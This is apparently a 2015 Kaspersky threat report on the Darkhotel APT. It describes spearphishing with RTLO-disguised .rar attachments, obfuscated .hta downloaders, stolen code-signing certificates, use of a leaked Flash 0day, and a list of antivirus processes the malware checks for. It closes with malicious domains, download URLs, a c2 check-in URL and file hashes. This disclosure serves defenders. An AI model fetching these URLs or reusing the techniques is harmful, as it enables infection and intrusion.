    "plain_text": "# Darkhotel’s attacks in 2015\n\n10 août 2015\n\n[Darkhotel APT](https://securelist.com/blog/research/66779/the-darkhotel-apt/) attacks dated 2014 and earlier are characterized by the misuse of stolen certificates, the\ndeployment of .hta files with multiple techniques, and the use of unusual methods like the infiltration of\nhotel Wi-Fi to place backdoors in targets’ systems. In 2015, many of these techniques and activities\nremain in use. However, in addition to new variants of malicious .hta, we find new victims, .rar\nattachments with RTLO spearphishing, and the deployment of a 0day from Hacking Team.\n\nThe Darkhotel APT continues to spearphish targets around the world, with a wider geographic reach than\nits previous botnet buildout and hotel Wi-Fi attacks. Some of the targets are diplomatic or have strategic\ncommercial interests.\n\nThe location of Darkhotel’s targets and victims in 2015:\n\n  - North Korea\n\n  - Russia\n\n  - South Korea\n\n  - Japan\n\n  - Bangladesh\n\n  - Thailand\n\n  - India\n\n  - Mozambique\n\n  - Germany\n\n2015 Darkhotel .hta and backdoor-related, exploit-related and c2 sites:\n\n  - storyonboard[.]net\n\n  - tisone360[.]org\n\n  - openofficev[.]info\n\n  - saytargetworld[.]net\n\n  - error-page[.]net\n\n  - eonlineworld[.]net\n\n  - enewsbank[.]net\n\n  - thewordusrapid[.]com\n\n2015 spearphishing incident attachment name subset:\n\n  - schedule(6.1~6).rar -> schedule(6.1~6)_?gpj.scr\n\n  - schedule(2.11~16).rar -> schedule(2.11~16)_?gpj.scr\n\n  - congratulation.rar -> congratulation_?gpj.scr\n\n  - letter.rar -> letter_?gpj.scr\n\n**Consistent use of obfuscated .hta downloaders**\n\n\n-----\n\nWhether the infection is achieved through spearphishing, physical access\nto a system or the Hacking Team Flash 0day, there frequently seems to be a common method for a\nnewly-infected system to communicate with Darkhotel’s c2:\n\nA lightly obfuscated (double escaped set of javascript variable values) script maintained within an .hta file\nwrites an executable to disk and executes it.\n\nIt is interesting that this particular group has for years now deployed backdoor and downloader code in\n[the form of .hta files. In 2010, we observed it re-purposing articles on North Korea](http://www.brookings.edu/research/opinions/2010/04/07-nuclear-arms-ohanlon) by the US think-tank,\n[Brookings Institute, in order to attack North Korean-related targets with malicious code buried in .hta files.](http://contagiodump.blogspot.com/2010/04/apr-23-link-hta-w-trojanwin32tapaouxa.html)\n[It also emailed links to its malicious .hta files to North Korean tourist groups, economists with an interest](http://www.nkeconwatch.com/2012/01/27/malicious-email-update/)\nin North Korea, and more. It’s somewhat strange to see such heavy reliance on older Windows-specific\n[technology like HTML applications, introduced by Microsoft in 1999.](https://msdn.microsoft.com/en-us/library/Bb250409(v=VS.85).aspx)\n\nFrom the recent sendspace.servermsys.com/downloader.hta:\n\nAfter execution and escaping a couple of variables, the .hta uses ancient Adodb.stream components in\norder to write out a string xor’d with 0x3d as an executable file and runs it.\n\nThis code results in the execution of “internet_explorer_Smart_recovery.exe”\n054471f7e168e016c565412227acfe7f, and a hidden browser window phoning back to its c2. In this case,\n\n\n-----\n\nit seems that Darkhotel operators are checking as to whether or not the\nvictim’s default browser is Internet Explorer, as all versions of IE return the value “0” and other browsers\nleave “appMinorVersion” undefined. This data collection seems somewhat odd, because .hta files are\nsupported and run by mshta.exe on Windows systems only, still delivered with Windows 8. Perhaps it is\nan artefact from early development of the code. Here is a recent version:\n“hxxp://sendspace.servermsys.com/readme.php?type=execution&result=created_and_executed&info=\" +\nnavigator.appMinorVersion + ”\n\nThe “internet_explorer_Smart_recovery.exe” file is a simple obfuscated downloader. A series of xor 0x28\nloops decrypt the contents of a self-deletion batch file, which is then written to disk and executed. Later in\nthe execution, a more complex rc4 loop decrypts the download url and other strings and imports.\n\nWhen finished, this url string decryption and connectback looks like\nhttp://sendspace.servermsys.com/wnctprx. The file is downloaded\n(b1f56a54309147b07dda54623fecbb89) to “.tmp” file in %temp%, executed, and the downloader exits.\nThis larger file is a backdoor/downloader that includes ssh functionality, and drops its keys to disk for ssh\ninteraction. We find older Darkhotel information stealers dropped and run on the system by these\ndownloaders.\n\n**Spearphishing and .rar Attachments with RTLO**\n\nThe Darkhotel APT will relentlessly spearphish specific targets in order to successfully compromise\nsystems. Some targets are spearphished repeatedly with much the same social-engineering schemes.\n\n\n-----\n\nFor example, the attachment “schedule(2.11~16).rar” could be sent on\nFebruary 10th, with Darkhotel returning to the same targets in late May for a second attempt with\nattachment “schedule(6.1~6).rar”.\n\nIt consistently archives RTLO .scr executable files within .rar archives, in order to appear to the target as\ninnocuous .jpg files. These executable files are lite droppers, maintaining these decoy jpeg files, and code\nto create an lnk downloader.\n\n\n-----\n\nWhen the target attempts to open what they think is a jpg image file, the executable code runs and drops\na jpg image to disk, then opens it with mspaint.exe in the background. This “congratulations” document is\nin Korean, revealing a likely characteristic of the intended target.\n\n\n-----\n\nWhile the image is displayed, the code drops an unusual mspaint.lnk shortcut to disk and launches it. The\nshortcut maintains a multiline target shell script. This technique is also used by other APTs as persistence\nmechanisms, as documented by our Mandiant colleagues. The 64kb lnk file is downloader code:\n\n\n-----\n\nWhen this lnk file is executed, it begins an AJAX-based download process for the “unzip.js” file\n(a07124b65a76ee7d721d746fd8047066) on openofficev.info. This is another wscript file implementing\nAJAX to download and execute a relatively large compiled executable:\n\n\n-----\n\nThis executable code is saved to %temp%\\csrtsrm.exe and executed\nthere. It is a relatively large executable (~1.2 mb) that injects malicious code and spawns remote threads\ninto legitimate processes.\n\n**Stolen certificates and evasion**\n\nThe group appears to maintain a stockpile of stolen certificates and deploys their downloaders and the\nbackdoors signed with them. Some of the more recent revoked certificates include ones that belong to\nXuchang Hongguang Technology Co. Ltd.\n\nDarkhotel now tends to hide its code behind layers of encryption. It is likely that it has slowly adapted to\nattacking better-defended environments and prefers not to burn these stolen digital certificates. In\nprevious attacks it would simply have taken advantage of a long list of weakly implemented, broken\ncertificates.\n\nNot only are its obfuscation techniques becoming stronger, but its anti-detection technology list is\ngrowing. For example, this signed downloader (d896ebfc819741e0a97c651de1d15fec) decrypts a set of\nanti-malware strings in stages to identify defensive technologies on a newly-infected system, and then\nopens each process, looking for a matching image name:\n\nc:\\avast! sandbox\\WINDOWS\\system32\\kernel32.dll - Avast!\navp.exe - Kaspersky Lab\nmcagent.exe;mcuicnt.exe - Intel/Mcafee\nbdagent.exe - BitDefender\nravmon.exe,ravmond.exe - Beijing Rising\n360tray.exe,360sd.exe,360rp.exe,exeMgr.exe - Qihoo 360\nayagent.aye,avguard.;avgntsd.exe - Avira Antivirus\nccsvchst.exe,nis.exe - Symantec Norton\navgui.exe,avgidsagent.exe,avastui.exe,avastsvc.exe - Avast!\nmsseces.exe;msmpeng.exe - Microsoft Security Essentials and Microsoft Anti-Malware Service\nAVK.exe;AVKTray.exe - G-Data\navas.exe - TrustPort AV\ntptray.exe - Toshiba utility\nfsma32.exe;fsorsp.exe - F-Secure\neconser.exe;escanmon.exe - Microworld Technologies eScan\nSrvLoad.exe;PSHost.exe - Panda Software\negui.exe;ekrn.exe - ESET Smart Security\npctsSvc.exe;pctsGui.exe - PC Tools Spyware Doctor\ncasc.exe;UmxEngine.exe - CA Security Center\ncmdagent.exe;cfp.exe - Comodo\nKVSrvXP.exe;KVMonXP.exe - Jiangmin Antivirus\nnsesvc.exe;CClaw.exe - Norman\nV3Svc.exe - Ahnlab\nguardxup. - IKARUS\nFProtTray. - F-Prot\nop_mon - Agnitum Outpost\nvba332ldr.;dwengine. - DrWeb\n\n\n-----\n\nEven the identifying information that the backdoor seeks from a system is\nnot decrypted until runtime. Like the “information-stealer” component documented in our [previous](https://securelist.com/files/2014/11/darkhotelappendixindicators_kl.pdf)\n[Darkhotel technical report, this component seeks to steal a set of data with which to identify the infected](https://securelist.com/files/2014/11/darkhotelappendixindicators_kl.pdf)\nsystem. Much of the information is collected with the same set of calls, i.e.\nkernel32.GetDefaultSystemLangID, kernel32.GetVersion, and kernel32.GetSystemInfo:\n\n  - Default system codepage\n\n  - Network adapter information\n\n  - Processor architecture\n\n  - Hostname and IP address\n\n  - Windows OS and Service Pack versions\n\nEssentially, much of this information-stealer code is the same as that observed in previous attacks.\n\n**Tisone360.com, Visits, and Hacking Team Flash 0day**\n\nThe tisone360.com site was especially interesting to us. In April 2015, Darkhotel was email-phishing with\nlinks to earlier (cve-2014) Flash exploits, and then, at the beginning of July, it began to distribute what is\nreported to be a leaked Hacking Team Flash 0day.\n\nIt looks like the Darkhotel APT may have been using the leaked HackingTeam Flash 0day to target\nspecific systems. We can pivot from “tisone360.com” to identify some of this activity. The site was up and\nactive as late as 22 July, 2015. However, this looks to be a small part of its activity. In addition to the\nicon.swf HT 0day (214709aa7c5e4e8b60759a175737bb2b), it looks as though the “tisone360.com” site\n[was delivering a Flash CVE-2014-0497 exploit in April. We reported the related vulnerability](https://securelist.com/blog/incidents/58244/cve-2014-0497-a-0-day-vulnerability/) to Adobe in\nJanuary 2014, when it was being used by the Darkhotel APT.\n\nRecently, the Darkhotel APT has maintained multiple working directories on this site.\n\nIt is the ims2 directory that is the most active. It contains a set of backdoors and exploits. The most\ninteresting of these is the reported Hacking Team Flash 0day, icon.swf. In the days following the public\nmention of this server, the crew slowly tightened down open access to /ims2/. Either way, the contents\ncontinued to be actively used.\nicon.swf (214709aa7c5e4e8b60759a175737bb2b) -> icon.jpg (42a837c4433ae6bd7490baec8aeb5091)\n-> %temp%\\RealTemp.exe (61cc019c3141281073181c4ef1f4e524)\n\n\n-----\n\nAfter icon.jpg is downloaded by the flash exploit, it is decoded with a multibyte xor key 0xb369195a02. It then downloads further components.\n\nIt’s interesting to note that the group appears to be altering the compilation and linker timestamps of its\nexecutable code to dates in 2013. We see this across multiple samples deployed and observed for the\nfirst time in mid-2015, including the icon.jpg downloader.\n\nA log of visits to the site directory records that the directory was set up on July 8th. A handful of visits to a\nspecific url on the server from five systems based in the following locations were recorded on the 8th and\n9th. Several of these are likely to be Darkhotel APT targets:\n\n  - Germany\n\n  - South Korea\n\n  - China (likely to be research)\n\n  - US\n\n  - Japan\n\nHowever, one of those systems hammered the site on the 9th, visiting almost 12,000 times in 30 minutes.\nThis volume of traffic is likely to represent a noisy scanning research attempt and not someone DoS’ing\nthe site:\n\nRecorded site visits following the 9th are likely to be unreliable and may be more researchers, responding\nto the growing notoriety of the site following the public reports on the 9th. Many of these approximately 50\nvisits come from a subset of the above systems and are repeated multiple times. Visits from the following\nlocations occurred on or after the 10th:\n\n  - Germany (likely to be research)\n\n  - Ukraine (likely to be research)\n\n  - Amazon Web Services, multiple locations (likely to be research)\n\n  - Googlebot, multiple locations\n\n  - US\n\n  - Ireland (likely to be research)\n\n  - Russia\n\n  - Brazil\n\n  - China\n\n\n-----\n\n  - Finland\n\n  - Canada\n\n  - Taiwan\n\n  - France (likely to be research)\n\n  - Czech Republic\n\n**A consistent attack flow**\n\nThe Darkhotel group tends to stick with what works. For example, for years we saw repeated use of\nspearphishing targets directly with .hta files. Now, as with the tisone360.com site above, we have seen\nrepeated use in 2015 of a creative chain of delivery sets.\ndownloader -> hta checkin -> info stealer -> more compiled components.\ndropper -> wsh script -> wsh script -> info stealer -> more compiled components\nspearphish -> dropper -> hta checkin -> downloader -> info stealer\n\nWhile a chain of delivery that includes obfuscated scripts within .hta files occurred as far back as 2011,\nthe volume appears to have picked up in 2014 and now 2015.\n\nopenofficev[.]info (2015)\noffice-revision[.]com (2014)\nonline.newssupply[.]net (2011)\n\n**Hiding infrastructure in plain sight**\n\nThe group is now more vigilant in maintaining its sites, tightening up configuration and response content.\nRight now, its c2 responds with anti-hero images of “Drinky Crow” from the alt Maakies cartoon:\n\n\n-----\n\nOther Darkhotel c2s tend to blend in with random sites on the web when\nincorrect or missing pages are visited. They are ripping images either from FOTOLIA or articles on\n[artisanal ice cream makers](http://www.motherearthnews.com/real-food/seasonal-recipes/artisan-ice-cream-zm0z11zalt.aspx) here:\n\n**HTA md5:**\n021685613fb739dec7303247212c3b09\n1ee3dfce97ab318b416c1ba7463ee405\n2899f4099c76232d6362fd62ab730741\n2dee887b20a06b8e556e878c62e46e13\n6b9e9b2dc97ff0b26a8a61ba95ca8ff6\n852a9411a949add69386a72805c8cb05\nbe59994b5008a0be48934a9c5771dfa5\ne29693ce15acd552f1a0435e2d31d6df\nfa67142728e40a2a4e97ccc6db919f2b\nfef8fda27deb3e950ba1a71968ec7466\n\n**Spearphish attachments md5:**\n5c74db6f755555ea99b51e1c68e796f9\nc3ae70b3012cc9b5c9ceb060a251715a\n560d68c31980c26d2adab7406b61c651\nda0717899e3ccc1ba0e8d32774566219\nd965a5b3548047da27b503029440e77f\ndc0de14d9d36d13a6c8a34b2c583e70a\n39562e410bc3fb5a30aca8162b20bdd0 (first seen late 2014, used into 2015)\ne85e0365b6f77cc2e9862f987b152a89 (first seen late 2014, used into 2015)\n\n**2015 large downloader md5:**\n5e01b8bc78afc6ecb3376c06cbceb680\n61cc019c3141281073181c4ef1f4e524\n3d2e941ac48ae9d79380ca0f133f4a49\n\n\n-----\n\nfc78b15507e920b3ee405f843f48a7b3\nda360e94e60267dce08e6d47fc1fcecc\n33e278c5ba6bf1a545d45e17f7582512\nb1f56a54309147b07dda54623fecbb89\n009d85773d519a9a97129102d8116305\n\n**Infostealers dropped in 2015**\n61637a0637fb25c53f396c305efa5dc5\na7e78fd4bf305509c2fc1b3706567acd\n\n**Subhosts and urls:**\ntisone360.com/img_h/ims2/icon.swf\ntisone360.com/img_h/ims2/1.php\ntisone360.com/img_h/ims2/icon.jpg\ntisone360.com/noname/img/movie.swf\ntisone360.com/noname/minky/face.php\ntisone360.com/htdoc/ImageView.hta\ntisone360.com/htdoc/page1/page.html\ndaily.enewsbank.net/wmpsrx64\ndaily.enewsbank.net/newsviewer.hta\nsaytargetworld.net/season/nextpage.php\nsendspace.servermsys.com/wnctprx\nerror-page.net/update/load.php\nphoto.storyonboard.net/wmpsrx64\nphoto.storyonboard.net/photoviewer.hta\nphoto.storyonboard.net/readme.php\nunionnewsreport.net/aeroflot_bonus/ticket.php\nwww.openofficev.info/xopen88/office2\nwww.openofficev.info/dec98/unzip.js\nwww.openofficev.info/open99/office32\n\nwww.openofficev.info/decod9/unzip.js\n\n**Parallel and Previous Research**\nCVE-2014-0497 – A 0-day Vulnerability\n[https://securelist.com/blog/incidents/58244/cve-2014-0497-a-0-day-vulnerability/](https://securelist.com/blog/incidents/58244/cve-2014-0497-a-0-day-vulnerability/)\n\nHacking Team Flash Zero-Day Tied To Attacks In Korea and Japan… on July 1\n[http://blog.trendmicro.com/trendlabs-security-intelligence/hacking-team-flash-zero-day-tied-to-attacks-in-](http://blog.trendmicro.com/trendlabs-security-intelligence/hacking-team-flash-zero-day-tied-to-attacks-in-korea-and-japan-on-july-1/)\n[korea-and-japan-on-july-1/](http://blog.trendmicro.com/trendlabs-security-intelligence/hacking-team-flash-zero-day-tied-to-attacks-in-korea-and-japan-on-july-1/)\n\nThe Darkhotel APT\n[https://securelist.com/blog/research/66779/the-darkhotel-apt/](https://securelist.com/blog/research/66779/the-darkhotel-apt/)\n\n## À propos de Kaspersky Lab\n\n\n-----\n\n_Kaspersky Lab est la première entreprise privée de cyber-sécurité au niveau_\n_mondial et l’une de celles enregistrant la croissance la plus rapide.
